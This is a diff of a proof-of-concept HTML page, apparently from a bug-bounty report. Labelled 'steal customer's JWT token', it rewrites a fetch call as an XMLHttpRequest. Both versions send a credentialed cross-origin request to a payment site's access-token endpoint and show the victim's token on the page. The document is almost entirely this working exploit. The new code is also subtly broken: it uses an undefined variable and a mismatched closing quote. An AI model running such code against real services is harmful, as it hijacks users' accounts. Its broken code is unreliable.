@@ -23,49 +23,26 @@ steal customer's JWT token
 
 <script>
 function loadReferenceData() {
-    const referenceElement = document.getElementById("customer");
-    
-    // 显示加载状态
-    referenceElement.innerHTML = '<span style="color: #666;">加载中...</span>';
- 
-    fetch('https://cashier-my4a.pipopay.com/user/v1/get_access_token?fp_token=', { // 替换为实际API地址
-        method: 'POST',
-        mode: 'cors', // 显式指定CORS模式
-        headers: {
-            'Content-Type': 'application/json',
-            // 如有需要可添加其他请求头，如Authorization
-        },
-		body:'{}',
-        credentials: 'include' // 如果需要携带Cookie可改为'include'
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`请求错误：${response.status} ${response.statusText}`);
-        }
-        return response.json();
-    })
-    .then(data => {
-        // 可根据实际数据结构调整展示格式
-        referenceElement.innerHTML = `
-            <div class="reference-content">
-                <h3>参考数据</h3>
-                <pre>${JSON.stringify(data, null, 2)}</pre>
-            </div>
-        `;
-        // 如果需要自定义数据展示，可替换为结构化渲染：
-        // referenceElement.innerHTML = `
-        //     <p>名称：${data.name}</p>
-        //     <p>值：${data.value}</p>
-        // `;
-    })
-    .catch(error => {
-        referenceElement.innerHTML = `<span style="color: #ff4d4f;">加载失败：${error.message}</span>`;
-        console.error('请求失败:', error);
-    });
-}
-	
-	
-	
+  const referenceElement = document.getElementById("customer");
+
+// 显示加载状态
+  referenceElement.innerHTML = '<span style="color: #666;">加载中...</span>';
+  var payload = JSON.stringify({});
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://cashier-my4a.pipopay.com/user/v1/get_access_token?fp_token=", true);
+  xhr.withCredentials = true; // 带 Cookie
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState !== 4) return;
+	  var responseData = JSON.parse(xhr.responseText);
+	  referenceElement.innerHTML = `
+	  <div class="reference-content">
+	  <h3>参考数据</h3>
+	  <pre>${JSON.stringify(data, null, 2)}</pre>
+	  </div>';
+  };
+  xhr.send(payload);
+}	
 </script>
   
 <a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
